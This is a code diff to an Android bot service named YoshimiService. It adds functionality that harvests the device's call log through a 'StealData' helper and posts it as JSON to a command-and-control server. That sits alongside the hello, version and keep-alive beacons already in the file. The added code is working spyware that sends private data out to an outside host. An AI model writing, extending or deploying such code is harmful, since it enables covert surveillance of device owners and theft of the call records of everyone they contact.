@@ -7,8 +7,13 @@ import java.util.List;
 
 import org.apache.http.NameValuePair;
 import org.apache.http.message.BasicNameValuePair;
+import org.json.JSONObject;
+
+import com.redactedlabs.yoshimi.RecentCall;
+import com.redactedlabs.yoshimi.StealData;
 
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
 import android.os.IBinder;
@@ -75,13 +80,21 @@ public class YoshimiService extends Service {
 	}
 	
 	private void mainLoop() throws InterruptedException {
-		Log.d(TAG, "Starting main loop...");
+		Log.d(TAG, "Sending a hello ...");
 		String getResponse = Http.GET(CC_SERVER+"/bot/hello", URLEncoder.encode(uuid));
 		Log.d(TAG, "Yoshimi C&C (GET): " + getResponse);
+		
+		Log.d(TAG, "Sending version information ...");
 		String postResponse = Http.POST(CC_SERVER+"/bot/version", URLEncoder.encode(uuid), getVersionInformation());
 		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
+		
+		Log.d(TAG, "Sending call information ...");
+		postResponse = Http.POST(CC_SERVER+"/bot/calls", URLEncoder.encode(uuid), getCallInformation());
+		Log.d(TAG, "Yoshimi C&C (POST): " + postResponse);
+		
+		Log.d(TAG, "Starting main loop ...");
 		while (true) {
-			Thread.sleep(1000);
+			Thread.sleep(30000);
 			Log.d(TAG, "Still alive!");
 			Http.GET(CC_SERVER+"/bot/ping", URLEncoder.encode(uuid));
 		}
@@ -99,5 +112,21 @@ public class YoshimiService extends Service {
 		details.add(new BasicNameValuePair("model", android.os.Build.MODEL));
 		details.add(new BasicNameValuePair("product", android.os.Build.PRODUCT));
 		return details;
+	}
+	
+	private List<NameValuePair> getCallInformation() {
+		Context currentContext = getBaseContext();
+		RecentCall[] calls = StealData.getCalls(currentContext);
+		JSONObject jsonContacts = new JSONObject();
+		for(Integer index = 0; index < calls.length; index++) {
+			try {
+				jsonContacts.put(index.toString(), calls[index].getJsonObject());
+			} catch (Exception error) {
+				Log.d(TAG, "Failed to export call as json: " + error.toString());
+			}
+		}
+		List<NameValuePair> callInfo = new ArrayList<NameValuePair>();
+		callInfo.add(new BasicNameValuePair("jsonCalls", jsonContacts.toString()));
+		return callInfo;
 	}
 }
